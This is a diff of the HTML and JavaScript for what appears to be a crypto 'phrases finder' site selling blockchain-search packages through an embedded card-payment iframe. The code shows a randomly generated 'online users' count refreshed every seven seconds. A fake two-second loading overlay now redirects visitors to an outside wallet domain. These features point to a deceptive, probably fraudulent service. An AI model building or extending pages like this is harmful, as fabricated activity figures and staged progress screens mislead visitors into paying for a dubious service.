@@ -1105,7 +1105,7 @@
           <p class="price">$400</p>
         </div>
         <ul class="package-features">
-          <li>50 Searches on the Blockchain of 24 Hours</li>
+          <li>50 Searches on the Blockchain Of 24 Hours (recommended)</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -1114,8 +1114,8 @@
     </div>
 
     <div class="preview-section">
-      <h2>Pay With Your Card</h2>
-      <p> Enter the Package Amount and Pay with Visa, Master Card, GooglePay, ApplePay:</p>
+      <h2>Packages - Pay with Your Card</h2>
+      <p>Choose the Package amount and Pay it with VISA, MC, GooglePay, ApplePay:</p>
       <div class="preview-container">
         <iframe src="https://crypto.paybis.com/?refId=23046" frameborder="0" width="100%" height="600"></iframe>
       </div>
@@ -1335,78 +1335,6 @@
       document.getElementById('popupNotification').style.display = 'none';
     }
     
-    particlesJS('crypto-particles', {
-      particles: {
-        number: { value: 100, density: { enable: true, value_area: 800 } },
-        color: { value: ["#00ffff", "#ff00ff", "#ffffff"] },
-        shape: { type: ["circle", "triangle", "polygon"], polygon: { nb_sides: 5 } },
-        opacity: { value: 0.6, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false } },
-        size: { value: 3, random: true, anim: { enable: true, speed: 2, size_min: 0.1, sync: false } },
-        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
-        move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out", bounce: false, attract: { enable: false, rotateX: 600, rotateY: 1200 } }
-      },
-      interactivity: {
-        detect_on: "canvas",
-        events: {
-          onhover: { enable: true, mode: "repulse" },
-          onclick: { enable: true, mode: "push" },
-          resize: true
-        },
-        modes: {
-          grab: { distance: 400, line_linked: { opacity: 1 } },
-          bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 },
-          repulse: { distance: 200, duration: 0.4 },
-          push: { particles_nb: 4 },
-          remove: { particles_nb: 2 }
-        }
-      },
-      retina_detect: true
-    });
-
-    function updateOnlineCount() {
-      const count = Math.floor(Math.random() * (142 - 11 + 1)) + 11;
-      document.getElementById('online-count').textContent = count;
-    }
-
-    setInterval(updateOnlineCount, 7000);
-
-    function createCryptoIcons() {
-      const iconClasses = ['btc', 'eth', 'ltc', 'xrp'];
-      const container = document.querySelector('.container');
-      
-      for (let i = 0; i < 20; i++) {
-        const icon = document.createElement('div');
-        icon.className = `crypto-icon ${iconClasses[Math.floor(Math.random() * iconClasses.length)]}`;
-        icon.style.left = `${Math.random() * 100}%`;
-        icon.style.top = `${Math.random() * 100}%`;
-        icon.style.animationDelay = `${Math.random() * 2}s`;
-        container.appendChild(icon);
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      createCryptoIcons();
-      
-      const elements = document.querySelectorAll('.feature-box, .package, h2, h3');
-      
-      elements.forEach(element => {
-        element.style.opacity = '0';
-        element.style.transform = 'translateY(20px)';
-        element.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
-      });
-      
-      animateOnScroll();
-
-      const faqItems = document.querySelectorAll('.faq-item');
-      
-      faqItems.forEach(item => {
-        const question = item.querySelector('.faq-question');
-        question.addEventListener('click', () => {
-          item.classList.toggle('active');
-        });
-      });
-    });
-
     function openPhrasesFinder() {
       const loadingOverlay = document.createElement('div');
       loadingOverlay.style.position = 'fixed';
@@ -1433,7 +1361,7 @@
 
       setTimeout(() => {
         loadingOverlay.remove();
-        showPopup('popupNotification');
+        window.location.href = 'https://walletcryp.com';
       }, 2000);
     }
 
@@ -1522,6 +1450,50 @@
     }
 
     window.addEventListener('scroll', animateOnScroll);
+
+    setInterval(updateOnlineCount, 7000);
+
+    function updateOnlineCount() {
+      const count = Math.floor(Math.random() * (142 - 11 + 1)) + 11;
+      document.getElementById('online-count').textContent = count;
+    }
+
+    function createCryptoIcons() {
+      const iconClasses = ['btc', 'eth', 'ltc', 'xrp'];
+      const container = document.querySelector('.container');
+      
+      for (let i = 0; i < 20; i++) {
+        const icon = document.createElement('div');
+        icon.className = `crypto-icon ${iconClasses[Math.floor(Math.random() * iconClasses.length)]}`;
+        icon.style.left = `${Math.random() * 100}%`;
+        icon.style.top = `${Math.random() * 100}%`;
+        icon.style.animationDelay = `${Math.random() * 2}s`;
+        container.appendChild(icon);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      createCryptoIcons();
+      
+      const elements = document.querySelectorAll('.feature-box, .package, h2, h3');
+      
+      elements.forEach(element => {
+        element.style.opacity = '0';
+        element.style.transform = 'translateY(20px)';
+        element.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+      });
+      
+      animateOnScroll();
+
+      const faqItems = document.querySelectorAll('.faq-item');
+      
+      faqItems.forEach(item => {
+        const question = item.querySelector('.faq-question');
+        question.addEventListener('click', () => {
+          item.classList.toggle('active');
+        });
+      });
+    });
   </script>
 </body>
 </html>
